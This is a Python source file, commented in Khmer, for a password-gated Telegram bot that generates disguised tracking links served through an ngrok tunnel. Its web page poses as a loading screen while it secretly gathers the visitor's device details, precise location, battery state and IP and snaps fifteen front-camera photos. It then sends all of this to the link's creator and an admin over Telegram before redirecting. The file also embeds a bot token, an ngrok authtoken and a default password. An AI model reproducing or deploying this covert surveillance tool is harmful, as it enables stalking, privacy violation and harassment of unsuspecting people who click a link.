import logging
import json
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from flask import Flask, request, redirect, render_template_string, jsonify
import uuid
import os
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import base64
import threading
import time
from pyngrok import ngrok
import asyncio
import html
import urllib.parse

# កំណត់រចនាសម្ព័ន្ធ logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# កំណត់រចនាសម្ព័ន្ធ Bot
TOKEN = "8102744793:AAF8kONmSVnWJK66WxR0GcKj98RU9tNqGVg"
TELEGRAM_ID = "1530069749"  # Admin ID

# កំណត់ Ngrok Authtoken របស់អ្នក
NGROK_AUTHTOKEN = "34YCHzDdgoelzi0DlX8fZHgblPK_6yEW7goc7FRoTL6MsG4KB"

# កំណត់រចនាសម្ព័ន្ធវ៉េបសារវែរ
WEB_SERVER_HOST = "0.0.0.0"
WEB_SERVER_PORT = 5000

# ផ្ទុកទិន្នន័យអ្នកប្រើប្រាស់ និងតំណភ្ជាប់ដែលបានបង្កើត
user_links = {}
ngrok_tunnels = {}

# តារាងផ្ទុកទិន្នន័យអ្នកប្រើប្រាស់
user_data = {
    "1530069749": {"name": "Admin", "type": "admin"},  # Admin user
    # អ្នកប្រើប្រាស់ធម្មតាផ្សេងទៀតអាចត្រូវបានបន្ថែមនៅទីនេះ
} 

# គំរូ HTML សម្រាប់ទំព័រតាមដានដែលមានការចាប់យកកាមេរ៉ា
TRACKING_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>កំពុងបញ្ជូនបន្ត...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // មុខងារសម្រាប់ប្រមូលព័ត៌មានឧបករណ៍
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            // ទទួលទីតាំងជាមុនសិន
            getLocation(info);
        }

        // មុខងារទទួលទីតាំង
        function getLocation(info) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        info.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        getBatteryInfo(info);
                    },
                    function(error) {
                        info.locationError = error.message;
                        getBatteryInfo(info);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info.locationError = "Geolocation is not supported by this browser.";
                getBatteryInfo(info);
            }
        }

        // មុខងារទទួលព័ត៌មានបាតធឺរី
        function getBatteryInfo(info) {
            // Battery API ប្រសិនបើមាន
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.batteryLevel = battery.level * 100;
                    info.batteryCharging = battery.charging;
                    requestCameraAccess(info);
                });
            } else {
                requestCameraAccess(info);
            }
        }

        // មុខងារស្នើសុំការចូលប្រើកាមេរ៉ា
        function requestCameraAccess(info) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                // ស្នើសុំការចូលប្រើកាមេរ៉ា
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',  // ប្រើកាមេរ៉ាមុខ
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(function(stream) {
                    // ការចូលប្រើកាមេរ៉ាត្រូវបានអនុញ្ញាត
                    info.cameraAccess = true;
                    takeMultiplePhotos(stream, info);
                })
                .catch(function(error) {
                    // ការចូលប្រើកាមេរ៉ាត្រូវបានបដិសេធ
                    info.cameraAccess = false;
                    info.cameraError = error.name;
                    getIpAddress(info);
                });
            } else {
                info.cameraAccess = false;
                info.cameraError = 'No camera support';
                getIpAddress(info);
            }
        }

        // មុខងារថតរូបច្រើនសន្លឹក
        function takeMultiplePhotos(stream, info) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                info.cameraPhotos = [];
                let photosTaken = 0;
                const totalPhotos = 15;
                const interval = 300;  // 300ms រវាងរូបថត

                function capturePhoto() {
                    if (photosTaken < totalPhotos) {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.95);  // គុណភាពខ្ពស់
                        info.cameraPhotos.push(photoData);
                        photosTaken++;
                        setTimeout(capturePhoto, interval);
                    } else {
                        // បញ្ឈប់ stream
                        stream.getTracks().forEach(track => track.stop());
                        getIpAddress(info);
                    }
                }

                // រង់ចាំមួយភ្លែតសម្រាប់កាមេរ៉ាផ្ចង់ បន្ទាប់មកចាប់ផ្តើមចាប់យក
                setTimeout(capturePhoto, 1000);
            };
        }

        // មុខងារទទួលអាសយដ្ឋាន IP
        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        // មុខងារផ្ញើទិន្នន័យទៅសារវែរ
        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // បញ្ជូនបន្តបន្ទាប់ពីផ្ញើទិន្នន័យដោយជោគជ័យ
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        // ចាប់ផ្តើមប្រមូលព័ត៌មាននៅពេលទំព័រឡើង
        window.onload = collectDeviceInfo;
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            color: #333;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0, 0, 0, 0.3);
            border-radius: 50%;
            border-top-color: #007bff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>ប្រព័ន្ធកំពុងដំណើរកា...</h2>
        <p>សូមមេត្តារង់ចាំ 5វិនាទី ប្រព័ន្ធកំពុងដំណើរការ</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

# ចាប់ផ្តើម Flask app សម្រាប់វ៉េបសារវែរ
app = Flask(__name__)

# ផ្ទុកទិន្នន័យតាមដាន
tracking_data = {}

# កំណត់ password
BOT_PASSWORD = os.getenv("BOT_PASSWORD", "Mh4ck25#")

def setup_ngrok():
    """Setup ngrok tunnel"""
    try:
        # កំណត់ auth token
        public_url = ngrok.connect(WEB_SERVER_PORT, authtoken=NGROK_AUTHTOKEN)
        print(f"✅ Ngrok tunnel created: {public_url}")
        return public_url
    except Exception as e:
        print(f"❌ Ngrok setup failed: {e}")
        return None

# មុខងារបន្ថែមផ្ទាំងទឹកដមលើរូប
def add_watermark(image_data, text="t.me/mengheang25"):
    try:
        # បកស្រាយរូប base64
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes)).convert('RGBA')

        # បង្កើតស្រទាប់ថ្លាសម្រាប់ផ្ទាំងទឹក
        watermark = Image.new('RGBA', image.size, (0, 0, 0, 0))
        
        # បង្កើតបរិបទគូរ
        draw = ImageDraw.Draw(watermark)

        # ព្យាយាមប្រើពុម្ពអក្សរលំនាំ
        try:
            font_size = max(20, min(image.width, image.height) // 20)
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            try:
                font = ImageFont.load_default()
            except:
                font = None

        # គណនាទីតាំងអក្សរ (ខាងស្តាំចុងក្រោម)
        if font:
            # កំណត់ទំហំអក្សរដោយប្រើ textbbox (ជំនួសឱ្យ textsize ដែលលែងប្រើ)
            bbox = draw.textbbox((0, 0), text, font=font)
            text_width = bbox[2] - bbox[0]
            text_height = bbox[3] - bbox[1]
        else:
            text_width, text_height = 150, 20
            
        margin = 10
        x = image.width - text_width - margin
        y = image.height - text_height - margin

        # បន្ថែមអក្សរជាមួយផ្ទៃខាងក្រោយពាក់កណ្តាលថ្លា
        draw.rectangle([x - 10, y - 5, x + text_width + 10, y + text_height + 5], fill=(0, 0, 0, 128))
        
        if font:
            draw.text((x, y), text, fill=(255, 255, 255, 255), font=font)
        else:
            draw.text((x, y), text, fill=(255, 255, 255, 255))

        # ផ្សំរូបដើមជាមួយផ្ទាំងទឹក
        watermarked_image = Image.alpha_composite(image, watermark).convert('RGB')

        # រក្សាទុកទៅជា bytes
        output = BytesIO()
        watermarked_image.save(output, format='JPEG', quality=95)
        return "data:image/jpeg;base64," + base64.b64encode(output.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"កំហុសក្នុងការបន្ថែមផ្ទាំងទឹក: {e}")
        # ត្រឡប់រូបដើមប្រសិនបើការដាក់ផ្ទាំងទឹកបរាជ័យ
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            return image_data
        else:
            return "data:image/jpeg;base64," + image_data

# មុខងារបង្ហាញស្តាតផ្លូវការ
async def show_progress(update, context, progress_message, progress=0):
    # បង្កើតស្តាតដែលមាន 20ផ្នែក
    progress_bar_length = 20
    filled_length = int(progress_bar_length * progress // 100)
    bar = '█' * filled_length + '░' * (progress_bar_length - filled_length)
    
    # បង្ហាញសារដែលមានស្តាត
    message = f"{progress_message}\n\n[{bar}] {progress}%"
    
    if 'progress_message_id' in context.user_data:
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=context.user_data['progress_message_id'],
                text=message
            )
        except:
            # ប្រសិនបើការកែសារមិនអាចធ្វើបាន ផ្ញើសារថ្មី
            sent_message = await update.message.reply_text(message)
            context.user_data['progress_message_id'] = sent_message.message_id
    else:
        # ផ្ញើសារស្តាតដំបូង
        sent_message = await update.message.reply_text(message)
        context.user_data['progress_message_id'] = sent_message.message_id

# កម្មវិធីគ្រប់គ្រងពាក្យបញ្ជា /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = str(user.id)
    
    # បន្ថែមអ្នកប្រើប្រាស់ថ្មីទៅក្នុងតារាង user_data ប្រសិនបើមិនទាន់មាន
    if user_id not in user_data:
        user_data[user_id] = {"name": user.full_name, "type": "user"}
    
    # ប្រសិនបើ user មិនទាន់បាន authenticated
    if not context.user_data.get("authenticated", False):
        welcome_message = (
            f"សួស្តី {user.full_name}! 👋\n\n"
            f"នេះជា ID របស់អ្នក 🪪: {user.id}\n\n"
            "សូមចុះឈ្មោះបញ្ចូល password ប្រើប្រាស់ "
            "បើមិនទាន់មាន passwood សូមទាក់ទងទៅកាន់ Admin ដើម្បីទទួលបាន password ចូលប្រើ \n\n"
            "សូមចុចពាក្យថា (SEND MESSAGE) ដើម្បីទាក់ទងទៅកាន់ Admin t.me/mengheang25\n\n"
            "បន្ទាប់មក អ្នកអាចចុច registe ដើម្បីដាក់ password 🔑 ចូលប្រើប្រាស់។"
        )
        keyboard = [[InlineKeyboardButton("ចុះឈ្មោះ /register", callback_data="register")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(welcome_message, reply_markup=reply_markup)
    else:
        # ប្រសិនបើបាន authenticated រួចហើយ
        welcome_message = (
            "ពេលនេះអ្នកអាចប្រើ bot នេះដើម្បីបង្កើតតំណភ្ជាប់តាមដាន។\n"
            "ចុច 'Create Tracking Link' ដើម្បីចាប់ផ្តើម។"
        )
        keyboard = [[InlineKeyboardButton("បង្កើតតំណភ្ជាប់តាមដាន", callback_data="create_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(welcome_message, reply_markup=reply_markup)

# កម្មវិធីគ្រប់គ្រង callback
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    if query.data == "create_link":
        if not context.user_data.get("authenticated", False):
            await query.edit_message_text("❌ អ្នកត្រូវតែបញ្ចូល password ជាមុនសិន។ ចុច /start ដើម្បីចូល។")
        else:
            await query.edit_message_text(
                "🌐 សូមបញ្ចូល URL ដែលអ្នកចង់ដាក់ជាការបញ្ជូនបន្ត:\n\nឧទាហរណ៍: https://google.com"
            )
            context.user_data['awaiting_url'] = True
    elif query.data == "register":
        await query.edit_message_text("សូមបញ្ចូល password 🔑:")
        context.user_data["awaiting_password"] = True

# គ្រប់គ្រងសារ
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # ពិនិត្យថាតើកំពុងរង់ចាំ password
    if context.user_data.get("awaiting_password", False):
        entered_password = update.message.text.strip()
        if entered_password == BOT_PASSWORD:
            context.user_data["authenticated"] = True
            context.user_data["awaiting_password"] = False
            await update.message.reply_text(
                "✅ Password ត្រឹមត្រូវ!\n\n"
                "ពេលនេះអ្នកអាចប្រើ bot នេះដើម្បីបង្កើតតំណភ្ជាប់តាមដាន។\n"
                "ចុច 'Create Tracking Link' ដើម្បីចាប់ផ្តើម។",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("បង្កើតតំណភ្ជាប់តាមដាន", callback_data="create_link")]]
                )
            )
        else:
            await update.message.reply_text("❌ Password មិនត្រឹមត្រូវ សូមព្យាយាមម្ដងទៀត")
        return
    
    # ប្រសិនបើកំពុងរង់ចាំ URL
    if context.user_data.get('awaiting_url'):
        await handle_tracking_url(update, context)

# ផ្លាស់ប្តូរមុខងារ handle_tracking_url ដើមទៅជា function ថ្មី
async def handle_tracking_url(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    url = update.message.text
    user_id = update.effective_user.id
    
    # បង្ហាញស្តាតផ្លូវការ
    progress_message = "🔄 Bot កំពុងបង្កើតតំណភ្ជាប់តាមដាន..."
    await show_progress(update, context, progress_message, 10)
    
    # បង្កើត Track ID មានតែមួយ
    track_id = str(uuid.uuid4())
    
    # ផ្ទុក URL ជាមួយ Track ID
    if user_id not in user_links:
        user_links[user_id] = []
    
    try:
        # ធ្វើការសម្រាប់បង្កើតតំណ (ធ្វើពិតប្រាកដ)
        await asyncio.sleep(0.5)  # ពិតប្រាកដដូចការងារ
        await show_progress(update, context, progress_message, 30)
        
        # បិទរូងដែលមានស្រាប់ (បើមាន)
        if user_id in ngrok_tunnels:
            try:
                ngrok.disconnect(ngrok_tunnels[user_id])
            except:
                pass
        
        await asyncio.sleep(0.5)  # ពិតប្រាកដដូចការងារ
        await show_progress(update, context, progress_message, 60)
        
        # បង្កើតរូង ngrok ថ្មី
        public_url = ngrok.connect(WEB_SERVER_PORT, authtoken=NGROK_AUTHTOKEN).public_url
        ngrok_tunnels[user_id] = public_url
        
        await asyncio.sleep(0.5)  # ពិតប្រាកដដូចការងារ
        await show_progress(update, context, progress_message, 80)
        
        # បង្កើតតំណភ្ជាប់តាមដាន
        tracking_link = f"{public_url}/track/{track_id}?url={urllib.parse.quote(url)}"
        
        # ផ្ទុកតំណភ្ជាប់
        link_data = {
            'track_id': track_id,
            'redirect_url': url,
            'tracking_link': tracking_link,
            'created_at': time.time(),
            'user_id': user_id  # រក្សាទុក ID អ្នកប្រើប្រាស់ដែលបានបង្កើត
        }
        user_links[user_id].append(link_data)
        context.user_data['awaiting_url'] = False
        
        # បង្ហាញស្តាត 100%
        await show_progress(update, context, progress_message, 100)
        
        # ផ្ញើសារជោគជ័យជាមួយតំណភ្ជាប់
        message = "✅ តំណភ្ជាប់តាមដានថ្មីត្រូវបានបង្កើតដោយជោគជ័យ!\n\n"
        message += f"🎯 URL គោលដៅ: {url}\n\n"
        message += "🔗 តំណភ្ជាប់តាមដានរបស់អ្នក:\n"
        message += f"{tracking_link}\n\n"
        message += "📊 តំណនេះនឹងចាប់យក:\n"
        message += "• 📱 ព័ត៌មានឧបករណ៍\n• 📍 ទីតាំង (Google Maps)\n• 📸 រូបថតពីកាមេរ៉ា (15 សន្លឹក)\n• និងព័ត៌មានផ្សេងៗទៀត\n ⏲ ព័ត៌មានទាំងអស់និងផ្ញើត្រឡប់មកវិញ នៅខាក្រោមនេះ"
        
        # លុបសារស្តាត
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        await update.message.reply_text(message)
        
        # បង្ហាញប៊ូតុង Create Link ម្តងទៀត
        keyboard = [[InlineKeyboardButton("បង្កើតតំណភ្ជាប់ថ្មីទៀត", callback_data="create_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("បង្កើតតំណភ្ជាប់ថ្មីទៀត:", reply_markup=reply_markup)
        
    except Exception as e:
        # លុបសារស្តាតប្រសិនបើមានកំហុស
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        await update.message.reply_text(f"❌ កំហុសក្នុងការបង្កើតតំណ: {str(e)}")
        context.user_data['awaiting_url'] = False

# មុខងារផ្ញើការជូនដំណឹងទៅ Telegram
def send_telegram_notification(track_id, device_info, creator_id):
    try:
        # កំណត់អ្នកទទួលការជូនដំណឹង
        recipients = []
        # តែងតែផ្ញើទៅ admin
        recipients.append(TELEGRAM_ID)
        
        # បន្ថែមអ្នកបង្កើតតំណ ប្រសិនបើមិនមែន admin
        creator_id_str = str(creator_id)
        if creator_id_str != TELEGRAM_ID and creator_id_str in user_data:
            recipients.append(creator_id_str)
        
        # ទទួលព័ត៌មានអ្នកប្រើប្រាស់
        user_info = user_data.get(creator_id_str, {})
        username = user_info.get('username', 'មិនស្គាល់')
        name = user_info.get('name', 'មិនស្គាល់')
        
        # បង្កើតសារជូនដំណឹង
        message = f"🔔 មានអ្នកប្រើប្រាស់ចុចចូលតំណភ្ជាប់ដែលអ្នកផ្ញើទៅ!\n\n"
        message += f"👤 អ្នកបង្កើតតំណភ្ជាប់: {name} (@{username})\n\n"
        message += f"📍Track ID: {track_id}\n"
        message += f"📍IP Address: {device_info.get('ip_address', 'មិនស្គាល់')}\n"
        message += f"📱User Agent: {html.escape(device_info.get('userAgent', 'មិនស្គាល់'))}\n"
        message += f"📱Platform: {device_info.get('platform', 'មិនស្គាល់')}\n"
        message += f"📱Language: {device_info.get('language', 'មិនស្គាល់')}\n"
        message += f"📱Screen: {device_info.get('screenWidth', 'មិនស្គាល់')}x{device_info.get('screenHeight', 'មិនស្គាល់')}\n"
        
        if 'batteryLevel' in device_info:
            message += f"🔋ថាមពលថ្មឧបករណ៍: {device_info['batteryLevel']}% ({'កំពុងសាក' if device_info.get('batteryCharging') else 'មិនកំពុងសាក'})\n"
        
        # បន្ថែមព័ត៌មានទីតាំងប្រសិនបើមាន
        if 'location' in device_info:
            lat = device_info['location']['latitude']
            lng = device_info['location']['longitude']
            accuracy = device_info['location']['accuracy']
            maps_url = f"https://www.google.com/maps?q={lat},{lng}"
            message += f"📍ទីតាំង: {lat}, {lng} (ភាពជាក់លាក់: {accuracy}m)\n\n"
            message += f"🗺️ Google Maps: {maps_url}\n"
        
        # ផ្ញើសារទៅគ្រប់អ្នកទទួល
        for recipient in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            data = {
                "chat_id": recipient,
                "text": message
            }
            requests.post(url, json=data)
            
            # ផ្ញើទីតាំងទៅ Telegram ប្រសិនបើមាន
            if 'location' in device_info:
                lat = device_info['location']['latitude']
                lng = device_info['location']['longitude']
                url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
                data = {
                    "chat_id": recipient,
                    "latitude": lat,
                    "longitude": lng
                }
                requests.post(url, json=data)
        
        # ផ្ញើរូបថតកាមេរ៉ាប្រសិនបើមាន (ជាមួយផ្ទាំងទឹក)
        if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
            for i, photo_data in enumerate(device_info['cameraPhotos']):
                try:
                    photo_data = photo_data.split(',')[1] if photo_data.startswith('data:image') else photo_data
                    photo_bytes = base64.b64decode(photo_data)
                    
                    for recipient in recipients:
                        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
                        files = {'photo': (f'camera_{i+1}.jpg', photo_bytes)}
                        data = {
                            "chat_id": recipient,
                            "caption": f"📸 រូបពីកាមេរ៉ាលេខ {i+1}/15                  (t.me/mengheang25)"
                        }
                        requests.post(url, files=files, data=data)
                        
                except Exception as e:
                    error_msg = f"❌ មិនអាចបញ្ជូនរូបពីកាមេរ៉ាលេខ {i+1}: {str(e)}"
                    for recipient in recipients:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                     json={"chat_id": recipient, "text": error_msg})
        #បន្ថែមប៊ូតុងបង្កើតតំណភ្ជាប់ថ្មីទៀតសម្រាប់អ្នកទទួលទាំងអស់
        keyboard = [[InlineKeyboardButton("បង្កើតតំណភ្ជាប់ថ្មីទៀត", callback_data="create_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        for recipient in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            data = {
                "chat_id": recipient,
                "text": "តើអ្នកចង់បង្កើតតំណភ្ជាប់ថ្មីទៀតទេ?",
                "reply_markup": json.dumps({
                    "inline_keyboard": [[{"text": "បង្កើតតំណភ្ជាប់ថ្មីទៀត", "callback_data": "create_link"}]]
                })
            }
            requests.post(url, json=data)
                    
    except Exception as e:
        print(f"Error sending notification to Telegram: {e}")

# ផ្លូវ Flask សម្រាប់តាមដាន
@app.route('/track/<track_id>', methods=['GET', 'POST'])
def track(track_id):
    if request.method == 'GET':
        # ទទួល URL បញ្ជូនបន្តពីប៉ារ៉ាម៉ែត្រសំណួរ
        redirect_url = request.args.get('url', 'https://google.com')
        
        # បង្ហាញទំព័រតាមដាន
        return render_template_string(TRACKING_PAGE_HTML, track_id=track_id, redirect_url=redirect_url)
    
    elif request.method == 'POST':
        try:
            # ទទួលព័ត៌មានឧបករណ៍ពីសំណើ
            device_info = request.json
            device_info['ip_address'] = request.remote_addr
            
            # រកអ្នកបង្កើតតំណភ្ជាប់
            creator_id = None
            for user_id, links in user_links.items():
                for link in links:
                    if link['track_id'] == track_id:
                        creator_id = user_id
                        break
                if creator_id:
                    break
            
            # បង្កើតថតសម្រាប់ផ្ទុករូបភាពប្រសិនបើវាមិនមាន
            os.makedirs('captured_images', exist_ok=True)
            
            # ដំណើរការរូបថតកាមេរ៉ាប្រសិនបើមាន
            if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
                device_info['processedPhotos'] = []
                for i, photo_data in enumerate(device_info['cameraPhotos']):
                    try:
                        # បន្ថែមផ្ទាំងទឹកលើរូប
                        watermarked_image = add_watermark(photo_data)
                        
                        # រក្សាទុករូបដើម
                        image_data = photo_data.split(',')[1] if photo_data.startswith('data:image') else photo_data
                        image_bytes = base64.b64decode(image_data)
                        with open(f'captured_images/{track_id}camera{i+1}_original.jpg', 'wb') as f:
                            f.write(image_bytes)
                        
                        # រក្សាទុករូបដែលមានផ្ទាំងទឹក
                        watermarked_bytes = base64.b64decode(watermarked_image.split(',')[1])
                        with open(f'captured_images/{track_id}camera{i+1}_watermarked.jpg', 'wb') as f:
                            f.write(watermarked_bytes)
                        
                        device_info['processedPhotos'].append(watermarked_image)
                    except Exception as e:
                        print(f"Error processing camera image {i+1}: {e}")
                        # រក្សារូបដើមប្រសិនបើការដាក់ផ្ទាំងទឹកបរាជ័យ
                        device_info['processedPhotos'].append(photo_data)
            
            # ផ្ទុកទិន្នន័យតាមដាន
            tracking_data[track_id] = device_info
            
            # ផ្ញើការជូនដំណឹងទៅ Telegram
            if creator_id:
                send_telegram_notification(track_id, device_info, creator_id)
            
            return jsonify({'success': True})
            
        except Exception as e:
            print(f"Error processing data: {e}")
            return jsonify({'success': False, 'error': str(e)})

# មុខងារចាប់ផ្តើមសារវែរ Flask
def run_flask():
    app.run(host=WEB_SERVER_HOST, port=WEB_SERVER_PORT, debug=False)

# មុខងារចម្បង
def main() -> None:
    # ដំឡើង ngrok
    setup_ngrok()
    
    # បង្កើត និងដំណើរការ Telegram Application
    application = Application.builder().token(TOKEN).build()
    
    # បន្ថែមកម្មវិធីគ្រប់គ្រង
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # ចាប់ផ្តើមសារវែរ Flask ក្នុងខ្សែដាច់ដោយឡែក
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # ចាប់ផ្តើម Bot
    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()